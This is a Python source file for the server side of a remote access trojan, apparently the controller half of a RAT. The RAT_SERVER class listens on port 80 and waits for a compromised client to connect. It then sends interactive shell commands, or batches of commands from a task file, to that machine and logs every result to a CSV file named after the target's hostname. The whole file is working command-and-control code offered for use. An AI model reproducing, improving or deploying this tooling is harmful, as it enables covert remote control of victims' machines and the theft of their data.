import socket, os
import threading
import csv
import time
import ssl
import sys

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def get_help(self):
        print("""
    Help:
        shell - normal shells, bash/cmd depending on client OS"
        kill or exit - is what it says, kills the script running on the client and server
        log - show the directory for the current csv log being used by the connection
        help - displays this listing
        taskfile - allows you to make a file with multiple commands to be 
            executed in a specified order seperated by newlines
            """)

    def make_csv(self, target):
        global csvName, hostname
        command = "hostname"
        client.send(command.encode())
        hostname = client.recv(1024).decode()
        csvName = time.strftime("%d%m%Y_%H%M%S+0000", time.gmtime())+"_"+hostname
        with open(csvName+'.csv', mode='w') as csv_file:
            fieldnames = ['datetime','targetName','targetNet','input','output']
            writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
            writer.writeheader()

    def add_to_csv(self, target, input, output):
        with open(csvName+'.csv', mode='a') as csv_file:
            fieldnames = ['datetime','targetName','targetNet','input','output']
            writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
            writer.writerow({'datetime': time.strftime("%d%m%Y%H:%M:%S+0000", time.gmtime()),'targetName': hostname,'targetNet': str(target),'input': input,'output': output})
            
    def build_connection(self):
        global client, addr, server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(5)
        print("listening on:" + str(self.host) + ":" + str(self.port))
        print("[*] Waiting for the client...")
        client, addr = server.accept()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {addr}")
      
    def connection(self):
        while True:
            command = input('Command >>  ')
            if not command:
                print("ERROR: Please provide a command for execution!")
                continue  
            elif command == 'help':
                self.get_help()
                continue
            elif command == 'shell':
                client.send(command.encode())
                while 1:
                    command = input('shell: ')
                    if command == 'back':
                        client.send(command.encode())
                        break
                    client.send(command.encode())
                    result_output = result()
                    print(result_output)
                    self.add_to_csv(addr, command, result_output)
                continue
            elif command.split()[0] == "taskfile":
                print(command.split()[0])
                client.send(command.split()[0].encode())
                with open(command.split(' ')[1], "r") as file:
                    for line in file:
                        print(line)
                        client.send(line.encode())
                        result_output = result()
                        print(result_output)
                        self.add_to_csv(addr, command, result_output)
                command = "exit"
                client.send(str.encode(command))
                continue
            elif command == "exit" or command == "kill":
                client.send(str.encode(command))
                server.close()
                break
            elif command == "log":
                curdir = os.getcwd()
                print(curdir+'\\'+csvName+'.csv')
            else:
                print(f"Unknown command {command}")
                print("Please use one of the available commands")
                self.get_help()
                continue
            

def result():
    recv_len = 1
    response = ""
    while recv_len:
        data = client.recv(1024).decode()
        recv_len = len(data)
        response += data

        if recv_len < 1024:
            break
    return(response)

rat = RAT_SERVER('0.0.0.0', 80)

def main():
    rat.build_connection()
    rat.make_csv(addr)
    rat.connection()

if __name__ == '__main__':
    main()
